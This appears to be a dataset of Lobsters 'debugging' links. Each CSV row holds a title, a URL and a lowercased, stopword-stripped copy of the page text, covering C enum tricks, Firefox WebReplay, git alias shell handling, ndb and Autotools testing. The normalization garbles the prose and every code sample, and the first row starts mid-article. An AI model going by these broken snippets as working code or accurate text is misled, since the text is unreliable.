shippable one software young nt competitive fastest gpus market time unless chose workload carefully excellent running compute shaders time tune software would got lot closer next rev chip would closed gap would strong chip highend visualization world tiny triangle supershort line massive data set main workload thing larrabee great never got time political get graphic side publicly cancelled year later publicly cancelled nt actually done first time people kept working third time secret bit later nt want anybody know people still working graphic lrb sad larrabee graphic device failed well yes always graphic programmer whole cpu architect thing total accident along way sad nt get show knc could really amazing emulation gpu still hugely proud team managed knc given brief first foremost real highlycoherent legacycompatible cpu running grownup o think could done graphic knc term hardware honestly really nothing sit think done x would saved knc hell chip still nt see could squeezed much time effort budget already feature kicked arse squeezed wire thanks george texture sampler instead would helped probably enough prevent u getting cancelled could certainly done another year tuning software could also done single longerterm software effort rather different shortterm one random whim upper management forced upon u whole long story could also wish graphicscapable version knl ie add texture unit back honestly imagine people could done five year since knc shipped allowed normal people access existing texture unit write graphic pipeline would amazing biggest regret forbidden exposing goodness already existed thing really annoys whole process even hard morose many concept instruction architecture feature part broader ecosystem form sure single person added many instruction popular instruction set world perfectly adequate legacy old polypusher vr thing instead maybe worked best edit post nt mention enum class http construct simply nt aware time seems programmer still nt know nt solve problem discussed help bunch discussion came twitter recently useful interesting twitter terrible place archive thing get subtlety put something concrete talk starting example enum people prefer use allcaps enums c basically defines drop practice quite mad c enum trainstate stuck going waiting stopped c enums bit halfbaked slightly better c one still bunch problem first get added enclosing namespace instead example stuck symbol main scope whereas really want type trainstate stuck use mean ca nt two enums value clash awful solution prefix one name enum also help thing like intellisensevisualassist ca nt remember exactly value enum take annoying thing ca nt ask many item enum want array one value per entry iterate eg user press key want next one also want wrap get end solution usually use add special last value called count note use lower case instead camelcaps hint special another one enums also seen people put upper case really highlight special also add comment people nt seen trick getting somewhere enum trainstate trainstatestuck trainstategoing trainstatewaiting trainstatestopped trainstatecount always last indicates many item use count like char ptrainstatereadablenames trainstatecount int trainstatecount etc see like separate type name enum underscore show separate part even though mixing camelcase underscore seems bit goofy first instead folk like wrap enums struct namespace name namespace trainstate enum stuck going waiting stopped count always last indicates many item use count like char ptrainstatereadablenames trainstate count int trainstate count etc point know many people underscore long including c think might le surprise leave way appearance typing cost nearly identical incidentally lot irritation fellow coder people use last rather count bad last implies last valid item count plus one need use lessorequals test nt like end much either stl taught u end actually oneofftheend somewhat familiar paradigm really need word one past end ie opposite penultimate suspect putting trainstatepostultimate codebase going cause griping people also said use start end enums nt start zero subranges also seen begin end match stl pattern general think use enums start get really icky dangerous case maybe necessary something like enum playercolour referee nt team playercolourreferee red team playercolourredstart always first red playercolourredbrightred playercolourredstart playercolourredorange playercolourredpink playercolourredend always last red real colour blue team playercolourbluestart always first blue playercolourbluenavy playercolourbluestart playercolourbluecyan playercolourbluesapphire playercolourblueend always last blue real colour obvious get icky ordering super important bunch sign careful changing first element block unused entry playercolourredend could fix playercolourbluestart playercolourredend added team green would disaster usage case extreme enums need lot care neat trick discovered making printable name enums mainly debugging shown charles bloomhttp cbloomrantsblogspotcom create enum list enum string time bit ugly unfortunately complete disaster term maintainability define trainstatexxyytable xx trainstatestuck yy xx trainstategoing xx trainstatewaiting xx trainstatestopped xx trainstatecount define xx x x define yy enum trainstate trainstatexxyytable undef xx undef yy define xx x x define yy const char trainstatename trainstatexxyytable undef xx undef yy thing like printf movement type trainstatename train movement mentioned article saving loading replaying debugging also useful loading old savegames may changed enum ordering meantime removed item matching string allows cope least highlight fact change figure another trick seen used reserve first item error value help spot unitialized data people object zero error may help case enum trainstate trainstateerror always first may indicate uninitialised data trainstatestuck trainstategoing trainstatewaiting trainstatestopped trainstatecount always last indicates many item fairly religious asserting default clause make even likely spot unitialised data indeed rather pattern switch train state case trainstatestuck something interesting stuck train break default nothing break prefer explicitly list every time switch train state case trainstatestuck something interesting stuck train break case trainstategoing case trainstatewaiting case trainstatestopped nothing break default assert false break benefit second method add new enumeration search codebase existing enums see place need add clause new one even adding nothing part morgan mcguire another way smart enumshttp look interesting enum trick let know might add nt say page contained anything useful move mouse text see line text starting close upper left click word
289,Lobsters,debugging,Debugging,Please Provide an Example App,https://www.codetriage.com/example_app,please provide example app,make example app get help faster sometimes example app fix problem spread word codetriage codetriage sign via github,example app application designed reproduce bug demonstrate issue example app gigantic repo private source code telling someone series bash command bug fixed understood reproduced every issue maintainer get decipher supposed happen spend minute hour piecing together reproduction usually get right ask clarification backandforth process take lot energy waste everyone time instead better provide example app beginning end day would rather maintainer spend time making example apps fixing issue make example app start clean app feature add whatever code necessary demonstrate issue add instruction readme describing boot app reproduce problem push example app somewhere public github bonus give app friend coworker see repro problem without instruction readme finally give link example app maintainer usually issue get help faster want issue fixed fast possible try help maintainer much possible make example app even take extra time ultimately lead issue getting fixed faster sometimes example app fix problem bug library instead code example app help find fix faster end finding fixing bug code consider rereading documentation seeing behavior library unclear consider sending documentation pr spread word see open bug report working reproduction ask example app better yet send link page help understand make example app codetriage codetriage easiest way get started contributing open source sign subscribe repos want help send contribution idea inbox easy peazy want know read codetriage sign via github
290,Lobsters,debugging,Debugging,Firefox Nightly just got time-travel debugging,https://gist.github.com/jasonLaster/1e220992c294a571dd9b59abd084ccf2,firefox nightly got timetravel debugging,time travel debugging webreplay getting started firefox nightly trying todomvc step step guide time travel debugging talk disclaimer,time travel debugging time travel refers ability record tab later replay webreplay technology useful local development might want pause step forward backwards pause rewind prior state rewind time console message logged rewind time element certain style layout rewind time network asset loaded also useful production ci might want save user recording exception fired view test recording test fails easily mock rerun integration test getting started install firefox nightly go config enable devtoolsrecordreplayenabled open new tab via tool web developer record execution trying time travel debugging work website still fairly new technology possible could run rough patch please tweet recommend trying todomvc grok basic go todomvc open debugger check cool new stepping button add breakpoint todoviewjs add todo step back step step step back done time travel dance step step guide time travel debugging talk gave j conf eu potential time travel debugging ca nt tell already think recording based debuggerw fundamentally change debug software disclaimer webreplay currently support o x webreplay still experimental may never land firefox
291,Lobsters,debugging,Debugging,WebReplay: Time Travel Debugging for Firefox,https://developer.mozilla.org/en-US/docs/Mozilla/Projects/WebReplay,webreplay time travel debugging firefox,learn debugger getting started firefox nightly record current tab live rewinding save recording replay machine save recording replay different machine partially implemented time travel feature step back rewind breakpoint seek console message timeline advanced option preference devtoolsrecordreplayenablerewinding devtoolsrecordreplayfastlogpoints devtoolsrecordreplaylogging architecture recordreplay infrastructure allowed nondeterminism recording replaying ipc integration middleman process recordingreplaying process extension rewinding infrastructure snapshot managing system resource debugger integration unrecordable execution porting comparison project rr replay project timetravel debugger appendix debugger detail debugger change inspecting replaying process appendix impact gecko development call new library function recording event disallowed area interaction middleman process,web replay longer developed mozilla however work continues standalone project learn web replay allows firefox content process record behavior replay later rewind earlier state replaying process preserve j behavior dom structure graphical update behavior occurred recording devtools debugger console used inspect control replay getting started enable web replay macos firefox nightly go devtools setting select enable webreplay web replay feature used tab recording replaying way start recording tab record current tab open developer tool click button indicated refresh tab start recording button colored blue tab recorded clicked stop recording open new tab recording mode click tool web developer web replay reload record tab menu item effect used developer tool open open saved recording new tab click tool web developer web replay open new recording tab menu item open new blank tab recorded live rewinding time recording tab rewound replay earlier behavior way back tab opened last time navigated easy way see open debugger developer tool press pause button rewind button replaying old behavior tab ca nt interacted resume recording interacting tab press pause button play button run forward end recording save recording replay machine clicking tool web developer web replay save recording menu item recording tab open allow entire recording saved file clicking tool web developer web replay load recording new tab menu item start new tab replay recording end developer tool used interact tab way recording tab though playing forward end pause tab instead allowing recording save recording replay different machine partially implemented recording replayed different machine one recorded requires using build firefox reasonably similar version operating system otherwise tab probably crash feature little testing polishing yet good definition reasonably similar time travel feature section describes extension developer tool use time travel help debug recordingreplaying tab step back paused reverse step button debugger developer tool step previous line executed allow inspecting program state opposite normal forward step button rewind breakpoint paused breakpoints set rewind button run back stop last time breakpoint set opposite normal button playing forward seek console message error logged message console developer tool clicked cause tab seek point recording error generated message logged tab pause point allow state inspected forwardreverse stepping forth timeline timeline shown developer tool provides several feature help navigating recording timeline change color depending whether tab currently recording red replaying blue current position within recording shown timeline progress indicator console errormessages marked timeline clicked seek point advanced option preference devtoolsrecordreplayenablerewinding disabled firefox record page signifcantly faster default true devtoolsrecordreplayfastlogpoints enabled firefox web replay evaluates logpoints consecutively logpoints sideeffects diverge recording othe way mode default false devtoolsrecordreplaylogging enabled firefox log web replay internal action terminal helpful debugging hang crash default false architecture several main component project recordreplay infrastructure record enough information recording replayed process run produce observable behavior ipc integration allows replaying process communicate chrome process using ipdl shared memory rewind infrastructure allows replaying process restore previous state still maintaining communication chrome process debugger integration allows j debugger read information need replaying process control process execution resumerewind debugger allowed change replaying process observable state recordreplay infrastructure broadly reliable recordreplay achieved controlling nondeterminism browser nondeterminism originates two source intrathread interthread intrathread nondeterministic behavior nondeterministic even absence action thread interthread nondeterministic behavior affected interleaving execution thread always behave given interleaving intrathread nondeterminism recorded later replayed thread behavior mainly originate system call io interthread nondeterminism handled first assuming program data race free shared memory access would otherwise race either protected lock use apis perform atomic operation record later replay order thread acquire lock extension release lock use condvars access lockprotected memory occur order atomic variable handled treating read writes wrapped lock acquirerelease recording enough however record nondeterministic source reproduce behavior exactly replaying process ipc debugger integration component may behave differently recording replaying different replay involve interthread communication call nondeterministic apis resulting nondeterminism must allowed within replaying process allowed nondeterminism slop design replaying process must nondeterministic enough ipc debugger component work nondeterministic observable behavior affected resolve slop minimizing tolerated nondeterminism replaying process must nondeterministic enough ipc debugger component work practice nondeterministic replay allowed following area heap allocation performed ipc debugger component differ recording replay j compilation internal state affected debugger presence hooksbreakpoints active differ recording replay debugger allocate gc thing allocation gc thing differ debugger presence example script compilation involves gc thing allocation observing change object change shape relaxing nondeterminism number ripple effect area mainly pointer value may differ recording replay point gc occur set object collected may differ nondeterminism prevented spreading far following technique different pointer value affect internal layout hash table prevent effect iteration order execution behavior table main table class plhashtable pldhashtable instrumented always iterate element order added recording replaying differing gc behavior cause object finalizers run different time prevent effect execution behavior gc finalizers affect recording instrumented finalizer action performed time replay recording even associated j object destroyed yet replay never used point recording finalized similarly gc behavior cause value read weak pointer differ recording replay difference affect recording weak pointer must instrumented replay hold onto target duration held recording recording recording content process differs normal content process following way call certain function intercepted hooking rewriting machine code entry point call different function signature including function used dispatch mach message call message intercepted wrapped callmessage first performed normally output recorded data stream thread performing call execution wrapped callmessage recording inner call suppressed performed normally without affecting recording function intercepted generally system call system library level general function compiled part gecko fair game acquisition order lock recorded data stream lock lock associated nondeterministic component recorded j gc helper thread lock access atomic variablesfields recorded global data stream protected global lock atomics related nondeterministic component excluded stream thread use file descriptor wait lock notify instead using native implementation locking condition variable least mac pthreads lockscvars seem use mix processlocal kernel state sometimes nt work correctly rewinding process behavior changed simplify recording way affect observable behavior example incremental gc nondeterministic component work posting event main thread deterministic component incremental gc disabled many behavioral change eventually removable graphic rendering entirely local content process instead communicating via ipc compositor ui process compositor recording process performs rendering additional instrumentation performed per allowed nondeterminism section ipc rewind debugger component active recording spawn number thread participate recording event execute live see section detail affect process behavior make easier ensure nondeterministic component effect recorded behavior certain code region marked disallowing event executing thread lock atomic event recorded done code associated nondeterministic component gc ion compilation help track behavior go unrecorded replaying replaying content process behaves way recording process except following call mach message intercepted recording also intercepted callmessage intercepted wrapped callmessage performed rather result callmessage read data stream returned caller emulating behavior callmessage requires process deterministic enough event play order thread recording replay data stream enough error checking place immediately detect replay gone sync recording recorded data stream specify acquisition order lock read used lock acquired order thread try acquire lock first wait next line similarly atomic access included recording occur order replay protected single global lock note could potentially big drag performance replay recording many hottest atomics refcounts gc counter forth associated nondeterministic component recorded ipc integration communication chrome process recording replaying process hereafter referred child process managed via separate middleman content process child process extended communicate middleman using special bidirectional channel message separate ipdl state middleman process middleman normal content process except spawn communicates child process avoids creating document using middleman provides following advantage ipdl communication greatly simplified chrome middleman process communicate using standard browser protocol pcontent pbrowser etc implementation actor middleman child process communicate channel message tuned demand recordingreplaying process middleman perform action would extremely difficult manage replaying process without going sync recording mainly includes running devtools contentside script middleman spawn multiple child process coordinate behavior run parallel one recording child two replaying child advantage spawning recording replaying child switching different child middleman effectively rewind live recording play forward allow user resume interacting tab finished inspecting state past advantage using two replaying process provide smoother experience rewinding recordingreplaying process extension initialization child process spawn thread participate recording ipc system call performs live even replaying thread sends receives message middleman message describe action child process able independently recording currently includes sending graphic update taking restoring process snapshot responding debugger request rewinding infrastructure child process rewound earlier state response message middleman recording process rewinds becomes replaying process rewinding happens periodically taking memory snapshot execution later restoring care must taken efficiency takingrestoring snapshot managing system resource restoring snapshot late process initialization first snapshot taken simply copy stacksregisters thread subsequent snapshot includes copy thread stacksregisters well diff containing original content page heap static memory modified since previous snapshot certain memory region excluded snapshot memory region allocated special api used state need preserved rewinding snapshot data may stored memory disk diffs computed first setting exception handler thread mac similar one used asmjs taking first snapshot addressable memory process enumerated writeprotected fault occur special exception handler thread unprotects memory copy content mark dirty next snapshot taken dirty memory examined change v copy made mechanism requires intercepting mmap similar low level allocation function newly addressable memory known anonymous mapping would otherwise intercepted included recording heap allocation nondeterministic replaying mprotect intercepted noped avoid interference dirty memory mechanism munmap intercepted actual unmapping performed memory need remapped restoring snapshot set free region maintained allow reusing memory snapshot taken main thread taking snapshot thread participating recording must enter idle state waiting threadspecific condition variable thread enter state whenever waiting acquire lock perform atomic action part recording recording thread may make blocking call library eg kevent allow thread snapshotted call instead performed separate thread participate recording calling thread may enter correct idle state even progress blocked call completing thread idle main thread computes memory diff read stack thread register state thread recorded calling setjmp idling restoring snapshot also done main thread taking snapshot thread enter idle state dirty memory information computed since last snapshot taken used restore heap state last snapshot memory diffs used restore earlier snapshot necessary thread individually responsible restoring stack wake idle state see main thread prepared new stack restore longjmp new register state copy new stack content managing system resource child process restores snapshot state system resource open unchanged care must taken make sure resource coherent process restore completes done following way instead creating destroying thread demand recordingreplaying thread needed created process initialization recording content try create thread spawned front recording fails thread idle recordingreplaying content try create run main function completing idle indefinitely ensures matter create restore snapshot set thread exist consistent stack location lock condition variable extent system resource avoid problem make sure thread waiting consistent variable saving restoring snapshot see section ipc integration us file descriptor communicating middleman left alone restoring snapshot whenever saving restoring snapshot consistent state child process constraint used message may sent middleman child process ensuring middleman process send message time child process may rewinding debugger integration debugging normal content process devtools j debugger run quite bit j code content process communicating chrome process primarily stream json data debugging child content process j code run middleman process code creates debugger object debugger provides information child process rather current middleman process debugger indicate child process interface transparent possible devtools j code debugger still create scriptobjectetc debug object refer specific thing child process devtools j code debugger life middleman process instead wrapping thing another compartment debug object hold heap structure information thing child process debugger explore heap sending message child process fill content debug object creates whenever debugger interacting child process child process paused point execution content debug object valid middleman notifies child process resume forward execution must rewind earlier snapshot child process pause breakpoint say debug object must reconstructed exception script script source object debug object continue hold referent resuming rewinding replaying process necessary script breakpoints work implemented ensuring ordering creation script script source deterministic mainly disabling thread parsing one behavior change recordingreplay user interface devtools child process normal content process except new ui button added rewinding find last time breakpoint hit reverse stepstepinstepout j state inspected debugger though extending cover dom inspection devtools feature hard unrecordable execution restriction execution recorded detectable recording nt attempt replay execution know match recording following execution run fundamental limit approach replayed execution throw overrecursion j exception ca nt reliably replayed overrecursion happens different time depending script compiled vary recording replaying similarly execution run memory point ca nt reliably replayed execution stopped point slow script dialog ca nt reliably replayed keeping track exact point interrupt occurred would require quite bit recording overhead nt seem worth try following execution unlikely supported initial release able handled point future asmjs code relies mprotect handle bound heap access mprotect work differently replaying cooperation needed asmjs exception handler dirty memory exception handler shared array buffer used web content introduce data race browser content buffer going fundamental assumption recordreplay infrastructure recording replaying execution using buffer require new technique like treating access buffer atomic probably unacceptable overhead performing access buffer single core keeping track context switch dom worker supported yet simplicity debugger integration currently able handle j code run main thread webgl supported yet us pretty different rendering path normal web content medium element supported yet many run third party multithreaded code nt tested infrastructure porting almost implementation work far macos window port work underway yet working difficulty figuring set system library apis intercept getting memory management dirty memory part rewind infrastructure work handling different graphic ipc pathway different platform comparison project lot existing work area closest project rr webkit replay project microsoft timetravel debugger compared rr work platform architecture supported gecko though substantial port work required part gecko rather separate tool mean developer wo nt need additional software use ca nt used debug software use multiple core recording replay preserve exact behavior context switch occur different time data race lead different behavior recording replay data race bug however sort nondeterminism fixed regardless design allows replaying process behave differently recording process allows fairly straightforward implementation ipc debugger integration microsoft webkit replay project operate higher level rr input browser nondeterministic behavior recorded replayed later microsoft project abstraction layer appears boundary j engine rest browser webkit project layer appears internal webkit apis cause j run behavior j code vary broadly project sit spectrum level boundary component whose behavior recorded rest system rr record behavior user space process boundary system call made kernel project record behavior outside system library call process make exception carved allowed nondeterminism draw target microsoft webkit project record smaller subset browser behavior project good point spectrum compared higher level project able operate stable thoroughly documented library apis focusing intercepting apis browser instrumentation recording overhead maintenance burden going forward minimized compared lower level project able tolerate nondeterminism code whose behavior recorded compiled gecko rather part immutable usually closedsource library lightly modified deal behavior function intercepting handle varying hash table layout ordering atomic access appendix debugger detail detailed information recordingreplaying process affect debugger option future improvement debugger change perspective devtools server debugging recordingreplaying process similar debugging live process execution paused debugger j object various child object used inspect execution state way either kind process main difference explicit command must sent debugger control execution replayresumebackward replayresumeforward member may called resume execution replaypause member may called pause execution next opportunity child process pause breakpoints snapshot point currently happen graphic update performed point j stack new onpopframe handler needed reversestepin operation operation debuggee require interaction system fail operation may property access evals object call example accessing font property failed operation currently produce placeholder incomplete result operation debuggee side effect eval xf avoided process resume forward backward side effect lost process reverts original state paused breakpoint effect cause strange behavior eval getting xf property directly could produce different value eval xf strange behavior could fixed due caching would good prevent least discourage user performing effectful operation underlying object debuggerobject inaccessible objectunsafedereference null described debugger integration child object besides script script source become invalid debugger resume execution must reconstructed time replaying process pause inspecting replaying process access j object replaying process currently done j debugger interface debuggerobject debuggerframeeval forth interface overlay separate implementation c debugger implemented devtoolsserveractorsreplaydebuggerjs communicates replaying process via json fairly easy extend new feature web console support appendix impact gecko development web replay designed minimize place part gecko need know interact however area gecko development impacted replay section describes main area ongoing development break replay cause test fail needinfo bhackett bugzilla question concern treeherder web replay test currently run macos opt build prefixed browserdbgrr call new library function nondeterministic behavior recordedreplayed process captured redirecting system library function process call rewriting machine code invoke recordreplay specific function signature record result function replay result later without actually invoking underlying library function redirected function include low level system call wrapper like sendmsgrecvmsg higher level function various cocoa interface list redirected function found toolkitrecordreplayprocessredirectdarwincpp call added gecko new system library function function may need redirections general redirections needed function compiled part gecko either b may behave differently recording replaying c depends data produced redirected function example corefoundation type like cfarrayref cfstringref simpler way telling redirection needed function replay test crash inside replaying new redirections added toolkitrecordreplayprocessredirectdarwincpp adding line function simple interface using various rrfunction macro missing redirections also temporarily worked around avoiding call mozilla recordreplay isrecordingorreplaying recording event disallowed area gc marking finalization may behave differently recording replaying recording event thread calling redirected library function using recorded lock recorded atomics disallowed time area recorded event also disallowed j interrupt callback recording event one area fail arethreadeventsdisallowed assertion failure usually result accessing recorded lock atomic core xpcom mozglue lock class mozilla atomic atomics recorded default many lock atomics nt actually need recorded order correctly replay recording lock atomic turned specifying recordreplay behavior dontpreserve either lock contructor argument atomic template argument interaction middleman process recording replaying execution extra content process involved middleman process described presence middleman requires special handling ipc internals graphic code additionally ipc channel used communicate middleman process also communicate recording process child middleman problem happen ipdl actor protocol setup recording middleman process ui process expects see one actor usual solution avoid setting actor middleman process mozilla recordreplay ismiddleman
292,Lobsters,debugging,Debugging,Git Aliases & Shell,https://bridge.grumpy-troll.org/2018/07/git-aliases-shell/,git alias shell,git alias shell clarity avoid cleverness inside configuration file documentation shell sidedigression per specification actually happens git configuration parsing already handled mean u credential helper http docsawsamazoncomcodecommitlatestuserguidesettinguphttpsunixeshtml conclusion,git alias shell july today took look one particular git repository configuration saw something slightly configuration credential helper dating old experiment awsâ codecommit decided dig deeper figure actual rule shell command inside git configuration file sidediversion took bit longer expected sunday ah well seen much cargoculted incorrect information online time figure accurate answer see leaning toothpick syndrome markedly increasing count backslashes little suspicion warranted fairness confused including today git logic try implement magic right fixups level beneath gittrace reporting pretty hidden either read source use strace style tool make simple case right even wrong make fancier case obtuse decided focus looking alias rule handled correct assumption mechanism involved clarity avoid cleverness inside configuration file step stated matter complexity really moved gitconfig separate helper script start worry string parsed handled situation correct response back away slowly breaking eyecontact create short script handle thing instead notwithstanding correctness sometimes need know tame beast git config documentation let start reading actual documentation found gitconfig alias command alias git command wrapper eg defining aliaslast catfile commit head invocation git last equivalent git catfile commit head avoid confusion trouble script usage alias hide existing git command ignored argument split space usual shell quoting escaping supported quote pair backslash used quote alias expansion prefixed exclamation point treated shell command example defining aliasnew gitk orighead invocation git new equivalent running shell command gitk orighead note shell command executed toplevel directory repository may necessarily current directory gitprefix set returned running git revparse original current directory see gitrevparse decent start thing go wrong mysteriously try something nontrivial simple forloop appears fail stage also following escape sequence beside recognized n newline character nl horizontal tabulation ht tab b backspace b char escape sequence including octal escape sequence invalid shell sidedigression something become important quirky corner posix shell handling despite posix giving u convention terminate option processing treat following parameter nonoption entry invoke shâ câ fooâ â using terminate option instead per specification c handling first nonoption parameter string providing input parsed shell command foo next parameter provides name command argv passthrough thus shâ câ fooâ â invoke shell equal parse handle foo first nonoption string examined see might option permutation thus sh c foo bar u risk u telling shell treat unset variable reference error instead foo invoked context argv bar u actually happens git git config parser shellorother invocation two layer worry config parser us comment marker unquoted terminate thing given sublist terminator shell syntax little unfortunate shell necessarily used alias treated shell command careful documentation wording treated shell mean shell used merely shell command handled git often resort using shell commitment git par configuration file handling basic stripping comment handling n substitution quoting alias mechanism come play git split string separate field invoking command without needing go near shell aliasc splitcmdline function handle splitting whitespace splitting within quoted string handle single doublequotes doublequotes supporting backslash escape purely avoiding breaking quoted state escape supported configuration parsing already handled alias foo barnbaz value stored alias foo instead quote handling splitcmdline quote inside original quote let u write alias foo printf sn first sec ond third invoke gittracetrue git foo trace exec gitfoo trace runcommand gitfoo trace runcommand printf sn first sec ond third first sec ond third note used avoid git config parser handle n strace show u strace ff git foo pid execve binsh binsh c printf sn first sec ond th printf sn first sec ond th var unfinished strace ff sh c printf sn first sec ond third execve binsh sh c printf sn first sec ond third var sequence n simply strace showing n twocharacter sequence string passed returning git codebase without exclamation mark splitcmdline used result put current process argv vector initial git argument processing effectively restarts letting git decide done without exclamation mark done quick clean simple everything assumes entry start exclamation mark exclamation mark mean really entry subcommand found gitc handlealias invocation runcommand struct useshell set entire string alias value passed single string whitespace handling splitcmdline apply useshell set still nt mean shell used mean runcommandc prepareshellcmd used construct shell command might mean shell used prepareshellcmd look see value command might single word without special character special character backtick â tn since whitespace list character simply two word enough trigger invoking shell shell invoked exact form invoked depends upon whether invoker command provided parameter commandline case shell invoked least four parameter argv first two sh c third string configuration parameter supplied git invoker parameter provided instead third parameter shell modified adding five character end five space quotation mark dollar sign commercial quotation mark git try clever assumes want argument available end whatever string given work simple command text try handle argument hindrance worked around fourth alwayspresent parameter shell text alias definition repeated name shell element new shell argv passed invoker git mean u handling autoinserted simple enough know need handled simply end alias definition shell comment character octothorpe unicode number sign correct alias definition gitconfig alias wibble set xnecho nfor x echo x done wobble x echo x done git configuration file parsing resulted list alias containing entry wibble one wobble stored string set x echo x echo x done without first two line invoke git wibble git wibble echo git wibble foo bar baz echo x echo foo foo x echo bar baz bar baz two invocation using git wobble instead make little condensed easier scan would resulted argv array processed using singlequotes string avoid introducing backslashes first sh c x echo x done x echo x done ignored shell null second sh c x echo x done x echo x done ignored shell foo bar baz null credential helper aws documentation currently http docsawsamazoncomcodecommitlatestuserguidesettinguphttpsunixeshtml run git config global credentialhelper aws codecommit credentialhelper used codecommit setting confirm believe wrong mechanism play git invokes command except without exclamation mark given complete path command tried foo git credentialfoo end git invoking sh c aws codecommit credentialhelper aws codecommit credentialhelper ignored shell get shell invoking aws codecommit credentialhelper get get clearly aws codecommit credentialhelper ignoring extraneous parameter relying upon available subcommands get store erase none contain whitespace degenerating harmless conclusion easier expected arbitrary shell git alias need know undocumented implicit sometimesadded still nt mean grumpy troll category git shell internals aws
293,Lobsters,debugging,Debugging,Ndb – An improved debugging experience for Node.js,https://github.com/GoogleChromeLabs/ndb,ndb improved debugging experience nodejs,ndb installation puppeteer thread local install set npm script getting started save change disk blackboxes typical node debugging async stepping eager evaluation screenshot contributing contributing guide thanks og smtlaissezfaire githubcomsmtlaissezfairendb,ndb ndb improved debugging experience nodejs enabled chrome devtools installation compatibility ndb requires node work best node installation ndb depends puppeteer downloads recent version chromium mac linux win global install npm npm install g ndb alternatively yarn yarn global add ndb global installation may fail different permission error find help thread window user installation may fail window compilation native dependency following command may help npm install g windowsbuildtools local install want ndb available npm script eg npm run debug run ndb indexjs install development dependency local install npm npm install savedev ndb alternatively yarn yarn add ndb dev set npm script case ndb available system path getting started start debugging nodejs application using one following way use ndb instead node command ndb serverjs alternatively prepend ndb ndb node serverjs prepend ndb front binary use binary prepend ndb npm run unit ndb npm run unit debug globally installed package mocha ndb mocha use local binary use npx prepend ndb npx mocha launch ndb standalone application debug npm script packagejson eg unit test cd project folder packagejson ndb source panel npm script sidebar click selected run button use ctrlcmd r restart last run run node command within ndb integrated terminal ndb connect automatically run open script source using run script context menu item ndb connect automatically well use prof flag profile app ctrlcmd r restarts profiling ndb powerful feature exclusively nodejs child process detected attached place breakpoints module required edit file within ui ctrlscmds devtools save change disk default ndb blackboxes script outside current working directory improve focus includes node internal library like streamwrapjs asynchooksjs fsjs behaviour may changed blackbox anything outside working dir setting addition use devtools functionality used typical node debugging breakpoint debugging async stack aka long stack trace async stepping etc console toplevel await object inspection advanced filtering eager evaluation console requires node j sampling profiler memory profiler screenshot contributing check contributing guide get overview ndb development thanks og ndb early smtlaissezfaire released first serious debugger nodejs ndb package name still preserved githubcomsmtlaissezfairendb thank scott generously donating package name
295,Lobsters,debugging,Debugging,"Testing with Autotools, Valgrind, and Gcov",http://ansuz.sooke.bc.ca/entry/233,testing autotools valgrind gcov,sopapipa protest disappointme home å mskala programming software autotools builtin testing idsgrep earlier posting memory checking valgrind valgrind colour electric fence thread testing helgrind checking test coverage gcov download svn repository update facebook facebook twitter reddit reddit linkedin linkedin,â sopapipa protest disappointme home å â sat feb mskala tag used programming software limited faith software testing partly lack faith software engineering general professionallywritten code crap people use methodology worse code seems inclined think best way remove bug code put first place nonetheless writing test fun interesting way avoid real work might enjoy reading testrelated thing tried couple recent project autotools builtin testing recently released first version idsgrep search program finding japanese kanji based visual structure outline concept earlier posting smallish c program line implement complicated algorithm algorithm original software idsgrep known good standard could compare especially much input data buggy development correctness important want know idsgrep produce weird output correctly reflecting weirdness input introducing error although written originally use also like encourage others use idsgrep important able handle whatever nonsense user subject think buggy important good way convey think wrong factor add situation automated testing might appropriate note describe included version release linked want actual code article either wait next version check svn nt big obstacle intended audience idsgrep typical gnu autotools build system autotools builtin support testing primarily handled automake particular give appropriate instruction include support make check target generated makefile invoke whatever test give think support relatively recent automake home machine currently version three year old seem update slowly bleedingedge seems semicoincidentally released three day ago searching web information testing automake turn lot old discussion hey would nt nice automake included test support much thirdparty documentation automake seems predate actual existence feature exist documented manual nt seem much talkedabout anywhere else official manual one reason article automake version implement make check one three way basically correspond three increasingly complicated set driver script ask built makefile simple driver parallel test driver actually provides several special feature beyond parallel dejagnu test driver requires additional set tool another package chose parallel test driver idsgrep requesting parallel test support first place easy given already autotools build system involves adding couple item line configureac initializes automake aminitautomake foreign paralleltests colortests formerly said foreign selects certain level gnu coding standard uptightness default level seems pantiesinabunch new item paralleltests selects parallel test driver script colortests selects output ansi colour option selected autotoolsgenerated makefile contain test harness however still necessary actually give test unfortunately automake manual nt really make clear exactly test harness supposed interface test bit piece interface spread throughout chapter testing without collected together clearly one place going try gather partly based experiment may complete fundamentally function test harness run thing listed test variable total many successful giving user pretty display summarizing result thing listed test successful complains record log file output standard output standard error purpose haruspicy thing listed test level name executable file later idsgrep shell script test subdirectory build theory could compiled program built makefile rule idsgrep setting test variable look like really something complicated involving gcov discussed later article without gcov layer would look like test testandor testanynot testbasicmatch testbighash testdemorgan testequal testkvggrone testmessages testspacing testtsugrone testunord testvgneko test communicate harness return code small integer passed caller exit command shell script harness recognizes least value test succeeded test skipped impossible inappropriate run test instance requires external software nt installed test optional feature disabled configuration option test appear cyan skip notation result counted separately success nt cause overall result fail regular failure would test failed epic way driver provides feature specifying test failure result considered good success result bad return code supposed test designated epic failure actually count failure even though said wanted count failure success nt think feature good idea wo nt discus article nonzero value appears nonzero value counted ordinary kind test failure using purpose seems work meanwhile standard output standard error test saved regardless whether test result pas fail file named test item plus log instance testandor result go testandorlog event overall result fail test harness also generates testsuitelog file top directory contains concatenation log file failed test log file overwritten run make check log file handling main difference parallel test driver simple test driver simple stuff go make standard io multiple test running get output mixed together feature parallel consequence fact make process test log file target one thing thrilled system want separate executable file every test system even moderate complexity may hundred individual test nt really want litter distribution tiny file might possible get around issue going deeper code creating log file compiler test would different commandline argument passed single test program rather different executable shell script idsgrep rolled multiple small related test script one fails dig log file figure exactly case failed typical example sorry unusual unicode character fundamental function idsgrep would nt good test without binsh test r kanjivgeids exit fi idsgrep kanjivgeids echo idsgrep kanjivgeids idsgrep kanjivgeids echo idsgrep kanjivgeids diff rm f demout exit else rm f demout exit fi script start checking kanjivgderived dictionary file needed test actually exists someone might well compile idsgrep without case test return magic return code causing skip result run idsgrep commandline utility four time four different query generate two different output file run diff output file return success failure differ finally clean file created get much technical detail idsgrep nt article point particular test verify boolean query operator obey demorgan law x x x x query implementing formula evaluated check result set side equation could fooled thing went wrong instance output empty case test script look one thing note use get shell process id prevents collision two copy test happen execute especially important contemplating parallel build nt bother trying write test shell script absolute maximum portability autoconfstyle portable shell mediated nt think worth circumstance lot said keeping complexity individual test far possible spend time fixing bug real code test script thus assume instance perl prerequisite idsgrep anyway reason named perl path memory checking valgrind simple automakemediated test described good checking basic correctness user configure package run make check run search program bunch different input check output basically test pas program probably said work development purpose though like examine software bit detail idsgrep written c fact spirit tricky thing 